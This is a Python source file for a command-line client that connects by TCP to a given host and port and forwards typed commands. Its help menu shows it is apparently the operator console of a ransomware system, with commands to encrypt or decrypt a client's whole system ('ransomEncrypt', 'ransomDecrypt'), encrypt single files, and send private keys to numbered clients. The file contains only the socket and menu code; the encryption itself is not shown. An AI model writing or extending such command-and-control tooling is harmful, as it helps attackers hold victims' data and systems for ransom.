import socket
import sys

class CommandClient:
    def __init__(self, host, port):
        self.host = host
        self.port = port
        self.sock = None
        self.connect_to_server()

    def connect_to_server(self):
        """Establishes a connection to the server."""
        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.connect((self.host, self.port))
        # Optionally handle the first message from the server if there's an expected handshake or greeting
        print(f"Connected to server at {self.host}:{self.port}")

    def send_command(self, command):
        """Sends a command to the server and handles the response."""
        try:
            self.sock.sendall(command.encode())
            response = self.sock.recv(1024)
            return response.decode()
        except Exception as e:
            print(f"Error: {e}")
            self.reconnect()  # Attempt to reconnect on failure
            return "Connection error. Please try again."

    def reconnect(self):
        """Re-establishes the connection to the server."""
        self.close()
        self.connect_to_server()

    def close(self):
        """Closes the connection to the server."""
        if self.sock:
            self.sock.close()
            self.sock = None

def print_help_menu():
    """Prints available commands and usage instructions."""
    print("""
Available Commands:
    send_private_key <client_id> - Send the private key to the specified client.
    encryptFile <client_id> <filename> - encrypts a specified file using the client's public key
    decyrptFile <client_id> <filename> - decrypts a file using the host's private key
    ransomEncrypt <client_id> - encrypts system using transmitted public key
    ransomDecrypt <client_id> - decrypts specified system
    exit - Exit the CLI tool.
    help - Show this help menu.
Usage:
    Command inputs should be in the form of '<command> [client_id]' where applicable.
""")

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: cli_tool.py <host> <port>")
        sys.exit(1)

    host = sys.argv[1]  # Host to connect
    port = int(sys.argv[2])  # Port to connect

    client = CommandClient(host, port)
    print_help_menu()

    try:
        while True:
            user_input = input("Enter command: ").strip()
            if user_input.lower() == 'exit':
                print("Exiting CLI tool.")
                break
            elif user_input.lower() == 'help':
                print_help_menu()
            else:
                response = client.send_command(user_input)
                print(response)
    finally:
        client.close()
